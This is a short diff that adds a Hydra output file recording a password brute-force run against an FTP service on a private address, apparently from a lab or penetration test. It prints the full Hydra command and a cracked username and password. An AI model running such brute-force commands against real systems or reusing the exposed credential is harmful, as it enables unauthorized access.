@@ -1,0 +1,2 @@
+# Hydra v9.6 run at 2026-05-25 05:38:08 on 10.49.131.187 ftp (hydra -l ftpuser -P ./password_ftp.txt -o brute_force_ftp.txt 10.49.131.187 ftp)
+[21][ftp] host: 10.49.131.187   login: ftpuser   password: 5iez1wGXKfPKQ
